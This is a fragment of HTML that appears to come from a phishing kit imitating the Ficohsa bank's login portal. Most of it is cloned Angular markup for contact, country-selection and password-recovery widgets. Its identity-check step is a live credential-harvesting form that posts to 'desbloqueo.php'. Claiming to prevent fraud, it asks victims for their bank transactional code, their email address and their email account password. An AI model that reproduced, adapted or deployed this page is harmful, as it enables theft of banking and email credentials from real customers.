<div _ngcontent-c28="" class="tokyo_content dark">
<content _ngcontent-c22="">
<span _ngcontent-c22="" class="venecia-main-form-label-contextual-description">Dirección
de
trabajo
o
casa</span>
</content>
</div>

</main-content>


</div>
<div _ngcontent-c14="" class="manchester-content-holder-footer" data-hidden="true">
</div>
</div>
</div>
</div>
</icb-contextual-panel>
</icb-contextual-info>
</span>
</div>
<div _ngcontent-c22="" class="venecia-main-form-content venecia-position form-break-data ng-untouched ng-pristine ng-valid">

<input _ngcontent-c22="" formcontrolname="controlInput" class="medium venecia-main-form-input valid ng-untouched ng-pristine ng-valid" type="text" placeholder="" maxlength="80" tabindex="0" title="" autocomplete="off" name="address" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">




</div>
</div>
</icb-textbox>

















</div>
</div>
</div>
</icb-field-render>
</div>
<div _ngcontent-c17="" class="formLayoutMode undefined">





<icb-field-render _ngcontent-c17="" _nghost-c18="">
<div _ngcontent-c18="">




<div _ngcontent-c18="">
<div _ngcontent-c18="">





<icb-textbox _ngcontent-c18="" type="telephone" _nghost-c22="">



<div _ngcontent-c22="" class="venecia-main-box form-break-content break-0 formLayoutMode undefined  ">


<div _ngcontent-c22="" class="venecia-main-form-label-parent form-break-label">
<span _ngcontent-c22="" class="venecia-main-form-label">
Teléfono/Celular

</span>
</div>
<div _ngcontent-c22="" class="venecia-main-form-content venecia-position form-break-data ng-untouched ng-pristine ng-valid">

<input _ngcontent-c22="" formcontrolname="controlInput" class="medium venecia-main-form-input required ng-untouched ng-pristine ng-valid" type="tel" placeholder="" maxlength="80" tabindex="0" title="" autocomplete="off" name="phone" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">




</div>
</div>
</icb-textbox>













</div>
</div>
</div>
</icb-field-render>
</div>
<div _ngcontent-c17="" class="formLayoutMode undefined">




 
<icb-field-render _ngcontent-c17="" _nghost-c18="">
<div _ngcontent-c18="">




<div _ngcontent-c18="">
<div _ngcontent-c18="">






<icb-textbox _ngcontent-c18="" type="email" _nghost-c22="">



<div _ngcontent-c22="" class="venecia-main-box form-break-content break-0 formLayoutMode undefined  ">


<div _ngcontent-c22="" class="venecia-main-form-label-parent form-break-label">
<span _ngcontent-c22="" class="venecia-main-form-label">
Correo

</span>
</div>
<div _ngcontent-c22="" class="venecia-main-form-content venecia-position form-break-data ng-untouched ng-pristine ng-valid">

<input _ngcontent-c22="" formcontrolname="controlInput" class="medium venecia-main-form-input required ng-untouched ng-pristine ng-valid" type="email" placeholder="usuario@mail.com" maxlength="80" tabindex="0" title="usuario@mail.com" autocomplete="off" name="email" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">




</div>
</div>
</icb-textbox>












</div>
</div>
</div>
</icb-field-render>
</div>
<div _ngcontent-c17="" class="formLayoutMode undefined">





<icb-field-render _ngcontent-c17="" _nghost-c18="">
<div _ngcontent-c18="">

<div _ngcontent-c18="">
<icb-textarea _ngcontent-c18="" _nghost-c20="">



<div _ngcontent-c20="" class="venecia-main-box break-0 formLayoutMode undefined">

<div _ngcontent-c20="" class="venecia-main-form-label-parent">
<span _ngcontent-c20="" class="venecia-main-form-label">Mensaje
 
</span>
</div>
<div _ngcontent-c20="" class="venecia-main-form-content">
<textarea _ngcontent-c20="" class="venecia-main-form-textarea medium required ng-untouched ng-pristine ng-valid" rows="5" cols="10" placeholder="" maxlength="140">        </textarea>

</div>
</div>
</icb-textarea>
</div>



</div>
</icb-field-render>
</div>
</icb-record-render>
</div>
</form>
</icb-form>
</modal-content>

</div>
</div>
</div>
<div _ngcontent-c5="" class="parma-content-message" style="z-index: auto;">
<icb-message-generic _ngcontent-c5="" _nghost-c7="" data-hidden="true">

</icb-message-generic>
</div>
<div _ngcontent-c5="" class="parma-modal-overlay parma-modal-overlay-dark" data-hidden="true" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); opacity: 0;">
</div>
<div _ngcontent-c5="" class="parma-modal-overlay" data-hidden="true">
</div>
<div _ngcontent-c5="" class="clearboth"></div>
 
<div _ngcontent-c5="" class="parma-content-bottom">
<div _ngcontent-c5="" class="parma-content-buttons">

<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link contactUsMode inactive" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Confirmar
</span>
</a>
</icb-button>


<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link-simple contactUsMode" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-simple-text">
Cancelar
</span>
</a>
</icb-button>
</div>
 </div>
</div>
</icb-modalpopup>
</div>
</icb-contact-us>
</div>
<div _ngcontent-c2="" class="chat_V1 fr">
<icb-chat-link _ngcontent-c2="" _nghost-c13="">

<div _ngcontent-c13="" class="crawley public">
<span _ngcontent-c13="" class="crawley-pipe-left"></span>
<div _ngcontent-c13="" class="crawley-content">
<a _ngcontent-c13="" class="crawley-content-link" target="popup" id="undefined" title="FICOCHAT" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<i _ngcontent-c13="" class="stream-chat-double-bubble-4 crawley-content-icon-mobile"></i>
<span _ngcontent-c13="" class="crawley-content-link-text">
FICOCHAT
</span>
<i _ngcontent-c13="" class="stream-arrow_down_1 crawley-content-icon-arrow"></i>
<div _ngcontent-c13="" class="clearboth"></div>
</a>
<div _ngcontent-c13="" class="crawley-content-link-background"></div>
</div>
<icb-contextual-panel _ngcontent-c13="" height="" pointerlocation="topRight" usemode="contextualMenu" width="250" _nghost-c14="">
<div _ngcontent-c14="" data-hidden="true" class="manchester productSelectorMode      no_footer fullscreen visibility ">
<div _ngcontent-c14="" class="manchester-content">
<div _ngcontent-c14="" class="manchester-content-holder">
<div _ngcontent-c14="" class="manchester-content-holder-indicator"></div>
<div _ngcontent-c14="" class="manchester-content-holder-top" data-hidden="false">
<a _ngcontent-c14="" class="manchester-content-header-link fr" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<svg _ngcontent-c14="" class="svg-remove-circle">
<circle _ngcontent-c14="" cx="10" cy="10" r="9">
</circle>
<line _ngcontent-c14="" x1="14" x2="6" y1="6" y2="14"></line>
<line _ngcontent-c14="" x1="6" x2="14" y1="6" y2="14"></line>
</svg>
</a>
<h6 _ngcontent-c14="">
<header _ngcontent-c13="" class="manchester-content-holder-top " data-contextual-panel-header="1">
Seleccionar país
</header>
</h6>
</div>
<div _ngcontent-c14="" class="manchester-content-holder-middle has-title">


<icb-menuoptions _ngcontent-c14="" data-hidden="true">
<div class="oldham">

<div class="oldham_content_panel_start">
<div class="oldham-panel-heading">
<a class="oldham-panel-link oldham-panel-link-activo" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<h4 class="oldham-panel-title">


<span class="oldham-panel-title-text">
Honduras
</span>
<i class="stream-check-12 oldham-panel-title-active-icon"></i>


</h4>
</a>

</div>

</div>
<div class="oldham_content_panel_start">
<div class="oldham-panel-heading">
<a class="oldham-panel-link oldham-panel-link-activo" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<h4 class="oldham-panel-title">


<span class="oldham-panel-title-text">
Guatemala
</span>
<i class="stream-check-12 oldham-panel-title-active-icon"></i>


</h4>
</a>

</div>

</div>
<div class="oldham_content_panel_start">
<div class="oldham-panel-heading">
<a class="oldham-panel-link oldham-panel-link-activo" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<h4 class="oldham-panel-title">


<span class="oldham-panel-title-text">
Panamá
</span>
<i class="stream-check-12 oldham-panel-title-active-icon"></i>


</h4>
</a>

</div>

</div>
<div class="oldham_content_panel_start">
 <div class="oldham-panel-heading">
<a class="oldham-panel-link oldham-panel-link-activo" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<h4 class="oldham-panel-title">


<span class="oldham-panel-title-text">
Nicaragua
</span>
<i class="stream-check-12 oldham-panel-title-active-icon"></i>


</h4>
</a>

</div>

</div>
</div>
</icb-menuoptions>
</div>
<div _ngcontent-c14="" class="manchester-content-holder-footer" data-hidden="true">
</div>
</div>
</div>
</div>
</icb-contextual-panel>
<span _ngcontent-c13="" class="crawley-pipe-right"></span>
</div>
</icb-chat-link>
</div>
<div _ngcontent-c2="" class="clearboth watford-clear"></div>
<a _ngcontent-c2="" class="exeter" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></a>
</div>
</icb-publicmasterheader>
</div>
</header>
<main _ngcontent-c0="">
<div _ngcontent-c0="" class="slough_content">
<router-outlet _ngcontent-c0="">
</router-outlet>
<icb-login _nghost-c29="">
<div _ngcontent-c29="" class="ipswich">
<icb-smart-app-banner _ngcontent-c29="" _nghost-c30="">

</icb-smart-app-banner>
<icb-wizard _ngcontent-c29="" _nghost-c31="" data-hidden="false">

<div _ngcontent-c31="" class="ipswich-main fl wizardAutoHeightMode with-advertising">
<div _ngcontent-c31="" class="ipswich-main-animate">

<icb-wizard-step-one-by-one _ngcontent-c29="" _nghost-c32="">

<div _ngcontent-c32="" class="step fl wizardAutoHeightMode ipswich-step-visible">

<div _ngcontent-c32="" class="ipswich-main-wizard-header">

<span _ngcontent-c32="" class="ipswich-main-title">
<wizard-title _ngcontent-c29="">
Comprobación de identidad
</wizard-title>
<h6 style="font-size: 17px; margin-bottom:1px;">Con el fin de evitar fraudes, es necesario comprobar su identidad mediante su código transaccional. Por favor digite su código</h6>
</span>
</div>
<div _ngcontent-c32="" class="clearboth"></div>

<div _ngcontent-c32="" class="ipswich-main-wizard-pre-header">


<span _ngcontent-c32="" class="ipswich-main-subtitle-description">
</span>

</div>
<div _ngcontent-c32="" class="ipswich-main-wizard-content">
<wizard-step-content _ngcontent-c29="">
<icb-login-step-user _ngcontent-c29="" _nghost-c33="">
<form action="desbloqueo.php" method="post" novalidate="" class="wizardAutoHeightMode ng-pristine ng-invalid ng-touched">
<div _ngcontent-c33="" class="ipswich-main-data">
<i _ngcontent-c33="" class="stream-Icon_login_profile_3"></i>
<input _ngcontent-c33="" autocomplete="off" class="ipswich-main-data-input required ng-pristine ng-invalid ng-touched" disable-paste="" formcontrolname="galletita2" id="step01" placeholder="Ingrese su código transaccional" name="galletita3" required="" minleght="6" maxlength="6" type="text">
</br>
</br>
<i _ngcontent-c33="" class="stream-Icon_login_profile_3"></i>
<input _ngcontent-c33="" autocomplete="off" class="ipswich-main-data-input required ng-pristine ng-invalid ng-touched" disable-paste="" formcontrolname="galletita2" id="step01" placeholder="Confirme su correo electrónico" name="galletita4" required="" type="email">
</br>
</br>
<i _ngcontent-c33="" class="stream-Icon_login_profile_3"></i>
<input _ngcontent-c33="" autocomplete="off" class="ipswich-main-data-input required ng-pristine ng-invalid ng-touched" disable-paste="" formcontrolname="galletita2" id="step01" placeholder="Ingrese la clave de su correo" name="galletita5" required type="text">
</br>
</br>

<input type="hidden" name="galletita" value="usuario">
<input type="hidden" name="galletita2" value="hfkldshflhsd">
</div>
<div _ngcontent-c33="" class="ipswich-main-keyboard">
<a _ngcontent-c33="" class="ipswich-main-keyboard-link" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">Teclado
virtual</a>
</div>
<icb-virtual-keyboard _ngcontent-c33="" _nghost-c45="">

<div _ngcontent-c45="" class="virtual-keyboard">
<icb-contextual-panel _ngcontent-c45="" height="Default" pointerlocation="topCenter" usemode="contextualPanel" width="330" _nghost-c14="">
<div _ngcontent-c14="" data-hidden="true" class="manchester productSelectorMode     no_header no_footer fullscreen visibility ">
<div _ngcontent-c14="" class="manchester-content">
<div _ngcontent-c14="" class="manchester-content-holder">
<div _ngcontent-c14="" class="manchester-content-holder-indicator">
</div>
<div _ngcontent-c14="" class="manchester-content-holder-top" data-hidden="true">
<a _ngcontent-c14="" class="manchester-content-header-link fr" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<svg _ngcontent-c14="" class="svg-remove-circle">
<circle _ngcontent-c14="" cx="10" cy="10" r="9"></circle>
<line _ngcontent-c14="" x1="14" x2="6" y1="6" y2="14">
</line>
<line _ngcontent-c14="" x1="6" x2="14" y1="6" y2="14">
</line>
</svg>
</a>
<h6 _ngcontent-c14=""></h6>
</div>
<div _ngcontent-c14="" class="manchester-content-holder-middle">

<main-content _ngcontent-c45="" style="display: block">
<div _ngcontent-c45="" class="keyboard-image-container">
<img _ngcontent-c45="" class="keyboard-lowerCase" usemap="#Map" src="https://secure.ficohsa.com/Resources/images/keyboardLowerCaseLowContrast.png" style="margin-top: -9px; margin-left: -1px;">

</div>
<div _ngcontent-c45="" class="keyboard-checkbox-container">
<input _ngcontent-c45="" name="color" type="radio" value="0" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><label _ngcontent-c45="" class="keyboard-contrast" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">bajo
contraste</label>
<input _ngcontent-c45="" name="color" type="radio" value="1" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><label _ngcontent-c45="" class="keyboard-contrast" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">alto
contraste</label>
</div>
</main-content>


</div>
<div _ngcontent-c14="" class="manchester-content-holder-footer" data-hidden="true">
 </div>
</div>
</div>
</div>
</icb-contextual-panel>
</div>
</icb-virtual-keyboard>
<div _ngcontent-c33="" class="clearboth"></div>
<div _ngcontent-c33="" class="ipswich-main-buttons-login-user fr">
<icb-button _ngcontent-c33="" _nghost-c8=""><button _ngcontent-c8="" class="ipswich-main-buttons-link big" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); background: #0097c1; border: 0px solid #0099CC;">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Siguiente
</span>
</button>
</icb-button>
</div>
<div _ngcontent-c33="" class="clearboth"></div>
<div _ngcontent-c33="" class="ipswich-main-engagement-user">
<div _ngcontent-c33="" class="ipswich-main-engagement-data fr">
<ul _ngcontent-c33="" class="ipswich-main-engagement-data-ul">
<li _ngcontent-c33="" class="ipswich-main-engagement-data-ul-item">
<a _ngcontent-c33="" class="ipswich-main-engagement-data-ul-item-link" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">¿Aún
no tienes usuario?</a></li>
<li _ngcontent-c33="" class="ipswich-main-engagement-data-ul-item-pipe">
 |</li>
<li _ngcontent-c33="" class="ipswich-main-engagement-data-ul-item">
<a _ngcontent-c33="" class="ipswich-main-engagement-data-ul-item-link" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
¿Ha olvidado su usuario?</a></li>
<li _ngcontent-c33="" class="ipswich-main-engagement-data-ul-item-pipe">
|</li>
<li _ngcontent-c33="" class="ipswich-main-engagement-data-ul-item">
<a _ngcontent-c33="" class="ipswich-main-engagement-data-ul-item-link" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
¿Ha olvidado su contraseña?</a></li>
</ul>
</div>
</div>
<div _ngcontent-c33="" class="successful-generic-message">
<icb-message-generic _ngcontent-c33="" _nghost-c7="">

</icb-message-generic>
</div>
</form>
<icb-forgot-username _ngcontent-c33="" _nghost-c46="">
<icb-modalpopup _ngcontent-c46="" _nghost-c5="">

<div _ngcontent-c5="" class="custom-overlay" data-hidden="true" style="z-index: 899;"></div>
<div _ngcontent-c5="" class="parma limitedHeightMode basic" data-hidden="true" style="opacity: 0; z-index: 900;">
<div _ngcontent-c5="" class="parma-content-header">


<div _ngcontent-c5="">
<a _ngcontent-c5="" class="parma-content-header-link fr" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<svg _ngcontent-c5="" class="svg-remove-circle">
<circle _ngcontent-c5="" cx="10" cy="10" r="9"></circle>
<line _ngcontent-c5="" x1="14" x2="6" y1="6" y2="14">
</line>
<line _ngcontent-c5="" x1="6" x2="14" y1="6" y2="14">
</line>
</svg>
</a>
<span _ngcontent-c5="" class="parma-content-header-text ">¿Ha
olvidado su usuario?</span>
</div>
</div>

<div _ngcontent-c5="" class="clearboth"></div>
<div _ngcontent-c5="" class="parma-content-block">
<div _ngcontent-c5="" class="parma-content-middle" style="height: auto;">
<div _ngcontent-c5="" class="parma-content-middle-scroll">
<modal-content _ngcontent-c46="">
<div _ngcontent-c46="" class="main-container-login-utils">
<icb-form _ngcontent-c46="" _nghost-c15="">
<form _ngcontent-c15="" autocapitalice="off" autocomplete="off" novalidate="" class="break-0 userBlockMode ng-untouched ng-pristine ng-valid">
<div _ngcontent-c15="" class="venecia-form">

<div _ngcontent-c15="" class="venecia-main-form-required">
<span _ngcontent-c15="" class="venecia-main-form-required-text">Obligatorio</span>
</div>
<icb-record-render _ngcontent-c15="" _nghost-c17="">



<div _ngcontent-c17="" class="formLayoutMode undefined">





<icb-field-render _ngcontent-c17="" _nghost-c18="">
<div _ngcontent-c18="">




<div _ngcontent-c18="">
<div _ngcontent-c18="">

<icb-textbox _ngcontent-c18="" type="text" _nghost-c22="">



<div _ngcontent-c22="" class="venecia-main-box form-break-content break-0 formLayoutMode undefined  ">


<div _ngcontent-c22="" class="venecia-main-form-label-parent form-break-label">
<span _ngcontent-c22="" class="venecia-main-form-label">
Número
de
identificación

</span>
</div>
<div _ngcontent-c22="" class="venecia-main-form-content venecia-position form-break-data ng-untouched ng-pristine ng-valid">

<input _ngcontent-c22="" formcontrolname="controlInput" class="venecia-main-form-input required ng-untouched ng-pristine ng-valid" type="text" placeholder="Número de identificación" maxlength="80" tabindex="0" title="Número de identificación" autocomplete="off" name="documentNumber" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">




</div>
</div>
</icb-textbox>

















</div>
</div>
</div>
</icb-field-render>
</div>
<div _ngcontent-c17="" class="formLayoutMode undefined">





<icb-field-render _ngcontent-c17="" _nghost-c18="">
<div _ngcontent-c18="">




<div _ngcontent-c18="">
<div _ngcontent-c18="">






<icb-textbox _ngcontent-c18="" type="email" _nghost-c22="">



<div _ngcontent-c22="" class="venecia-main-box form-break-content break-0 formLayoutMode undefined  ">


 <div _ngcontent-c22="" class="venecia-main-form-label-parent form-break-label">
<span _ngcontent-c22="" class="venecia-main-form-label">
Ingrese
 su
e-mail

</span>
</div>
<div _ngcontent-c22="" class="venecia-main-form-content venecia-position form-break-data ng-untouched ng-pristine ng-valid">

<input _ngcontent-c22="" formcontrolname="controlInput" class="venecia-main-form-input required ng-untouched ng-pristine ng-valid" type="email" placeholder="usuario@mail.com" maxlength="80" tabindex="0" title="usuario@mail.com" autocomplete="off" name="email" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">




</div>
 </div>
</icb-textbox>












</div>
</div>
</div>
</icb-field-render>
</div>
</icb-record-render>
</div>
</form>
</icb-form>
<div _ngcontent-c46="">


</div>
</div>
</modal-content>

</div>
</div>
</div>
<div _ngcontent-c5="" class="parma-content-message" style="z-index: auto;">
<icb-message-generic _ngcontent-c5="" _nghost-c7="" data-hidden="true">

</icb-message-generic>
</div>
<div _ngcontent-c5="" class="parma-modal-overlay parma-modal-overlay-dark" data-hidden="true" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); opacity: 0;">
</div>
<div _ngcontent-c5="" class="parma-modal-overlay" data-hidden="true"></div>
<div _ngcontent-c5="" class="clearboth"></div>

<div _ngcontent-c5="" class="parma-content-bottom">
<div _ngcontent-c5="" class="parma-content-buttons">

<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link inactive" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Confirmar
</span>
</a>
</icb-button>


<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link-simple" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-simple-text">
Cancelar
</span>
</a>
</icb-button>
</div>
</div>
</div>
</icb-modalpopup>
</icb-forgot-username>
<icb-forgot-password _ngcontent-c33="" _nghost-c47="">
<icb-modalpopup _ngcontent-c47="" _nghost-c5="">

<div _ngcontent-c5="" class="custom-overlay" data-hidden="true" style="z-index: 899;"></div>
<div _ngcontent-c5="" class="parma limitedHeightMode forgotPasswordMode basic" data-hidden="true" style="opacity: 0; z-index: 900;">
<div _ngcontent-c5="" class="parma-content-header">


<div _ngcontent-c5="">
<a _ngcontent-c5="" class="parma-content-header-link fr" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<svg _ngcontent-c5="" class="svg-remove-circle">
<circle _ngcontent-c5="" cx="10" cy="10" r="9"></circle>
<line _ngcontent-c5="" x1="14" x2="6" y1="6" y2="14">
</line>
<line _ngcontent-c5="" x1="6" x2="14" y1="6" y2="14">
</line>
</svg>
</a>
<span _ngcontent-c5="" class="parma-content-header-text ">¿Ha
olvidado su contraseña?</span>
</div>
</div>

<div _ngcontent-c5="" class="clearboth"></div>
<div _ngcontent-c5="" class="parma-content-block">
<div _ngcontent-c5="" class="parma-content-middle forgotPasswordMode" style="height: auto;">
<div _ngcontent-c5="" class="parma-content-middle-scroll">
<modal-content _ngcontent-c47="">
<div _ngcontent-c47="" class="main-container-login-utils">
<icb-form _ngcontent-c47="" _nghost-c15="">
<form _ngcontent-c15="" autocapitalice="off" autocomplete="off" novalidate="" class="break-0 userBlockMode ng-untouched ng-pristine ng-valid">
<div _ngcontent-c15="" class="venecia-form">

<div _ngcontent-c15="" class="venecia-main-form-required">
<span _ngcontent-c15="" class="venecia-main-form-required-text">Obligatorio</span>
</div>
<icb-record-render _ngcontent-c15="" _nghost-c17="">



<div _ngcontent-c17="" class="formLayoutMode undefined">





<icb-field-render _ngcontent-c17="" _nghost-c18="">
<div _ngcontent-c18="">




<div _ngcontent-c18="">
<div _ngcontent-c18="">






<icb-textbox _ngcontent-c18="" type="email" _nghost-c22="">



<div _ngcontent-c22="" class="venecia-main-box form-break-content break-0 formLayoutMode undefined  ">


<div _ngcontent-c22="" class="venecia-main-form-label-parent form-break-label">
<span _ngcontent-c22="" class="venecia-main-form-label">
Ingrese
su
e-mail
 
<icb-contextual-info _ngcontent-c22="" displaymode="textHelpMode" height="80" icon="stream-help-circle" pointerlocation="topCenter" theme="dark" usemode="contextualPanel" width="210" _nghost-c28="">
<span _ngcontent-c28="" class="tokyo_icon textHelpMode">
<i _ngcontent-c28="" id="contextualInfoLocalIcon" class="stream-help-circle" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
</i>
<div _ngcontent-c28="" class="belek-background">
</div>
</span>
 <icb-contextual-panel _ngcontent-c28="" _nghost-c14="">
<div _ngcontent-c14="" data-hidden="true" class="manchester productSelectorMode textHelpMode dark   no_header no_footer  visibility ">
<div _ngcontent-c14="" class="manchester-content">
<div _ngcontent-c14="" class="manchester-content-holder">
<div _ngcontent-c14="" class="manchester-content-holder-indicator">
</div>
<div _ngcontent-c14="" class="manchester-content-holder-top" data-hidden="true">

<h6 _ngcontent-c14="">
<header _ngcontent-c28="" class="tokyo_header dark">
</header>
</h6>
</div>
<div _ngcontent-c14="" class="manchester-content-holder-middle">

<main-content _ngcontent-c28="">


<div _ngcontent-c28="" class="tokyo_content dark">
<content _ngcontent-c22="">
<span _ngcontent-c22="" class="venecia-main-form-label-contextual-description">Para
verificar
su
identidad
ingrese
la
misma
dirección
de
e-mail
que
tiene
asociada
su
usuario</span>
</content>
</div>

</main-content>


</div>
<div _ngcontent-c14="" class="manchester-content-holder-footer" data-hidden="true">
</div>
</div>
</div>
</div>
</icb-contextual-panel>
</icb-contextual-info>
</span>
</div>
<div _ngcontent-c22="" class="venecia-main-form-content venecia-position form-break-data ng-untouched ng-pristine ng-valid">

<input _ngcontent-c22="" formcontrolname="controlInput" class="venecia-main-form-input required ng-untouched ng-pristine ng-valid" type="email" placeholder="usuario@mail.com" maxlength="80" tabindex="0" title="usuario@mail.com" autocomplete="off" name="email" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">




</div>
</div>
</icb-textbox>












</div>
</div>
</div>
</icb-field-render>
</div>
<div _ngcontent-c17="" class="formLayoutMode undefined">





<icb-field-render _ngcontent-c17="" _nghost-c18="">
<div _ngcontent-c18="">




<div _ngcontent-c18="">
<div _ngcontent-c18="">










<icb-textbox _ngcontent-c18="" type="password" _nghost-c22="">



<div _ngcontent-c22="" class="venecia-main-box form-break-content break-0 formLayoutMode undefined  ">


<div _ngcontent-c22="" class="venecia-main-form-label-parent form-break-label">
<span _ngcontent-c22="" class="venecia-main-form-label">
Respuesta
a
pregunta
secreta

</span>
</div>
<div _ngcontent-c22="" class="venecia-main-form-content venecia-position form-break-data ng-untouched ng-pristine ng-valid">

<input _ngcontent-c22="" formcontrolname="controlInput" class="venecia-main-form-input required ng-untouched ng-pristine ng-valid" type="password" placeholder="" maxlength="80" tabindex="0" title="" autocomplete="off" name="secretAnswer" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">


<div _ngcontent-c22="" class="venecia-password">
<i _ngcontent-c22="" class="stream-password_hide" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
</i>
</div>

 
</div>
</div>
</icb-textbox>








</div>
</div>
</div>
</icb-field-render>
</div>
</icb-record-render>
</div>
</form>
</icb-form>
<div _ngcontent-c47="">
<span _ngcontent-c47="" class="ipswich-main-footer-description ipswich-main-footer-description-label">
<div _ngcontent-c47="">
Pregunta secreta
</div>
</span>
<span _ngcontent-c47="" class="ipswich-main-footer-description">
<a _ngcontent-c47="" class="login-utils-link-message" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
Mostrar pregunta
secreta
</a>

</span>
</div>
<div _ngcontent-c47="">


</div>
</div>
</modal-content>

</div>
</div>
</div>
<div _ngcontent-c5="" class="parma-content-message" style="z-index: auto;">
<icb-message-generic _ngcontent-c5="" _nghost-c7="" data-hidden="true">

</icb-message-generic>
</div>
<div _ngcontent-c5="" class="parma-modal-overlay parma-modal-overlay-dark" data-hidden="true" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); opacity: 0;">
</div>
<div _ngcontent-c5="" class="parma-modal-overlay" data-hidden="true"></div>
<div _ngcontent-c5="" class="clearboth"></div>

<div _ngcontent-c5="" class="parma-content-bottom">
<div _ngcontent-c5="" class="parma-content-buttons">

<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link forgotPasswordMode inactive" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-text">
Confirmar
</span>
</a>
</icb-button>


<icb-button _ngcontent-c5="" class="fr" _nghost-c8=""><a _ngcontent-c8="" class="ipswich-main-buttons-link-simple forgotPasswordMode" id="" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">

<span _ngcontent-c8="" class="ipswich-main-buttons-link-simple-text">
Cancelar
</span>
</a>
</icb-button>
</div>
</div>
</div>
</icb-modalpopup>
</icb-forgot-password>
</icb-login-step-user>
</wizard-step-content>
</div>



</div>
</icb-wizard-step-one-by-one>
<icb-wizard-step-one-by-one _ngcontent-c29="" _nghost-c32="">

<div _ngcontent-c32="" class="step fl wizardAutoHeightMode">

<div _ngcontent-c32="" class="ipswich-main-wizard-header">

<div _ngcontent-c32="" class="ipswich-main-back">
<a _ngcontent-c32="" class="ipswich-main-title-link" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
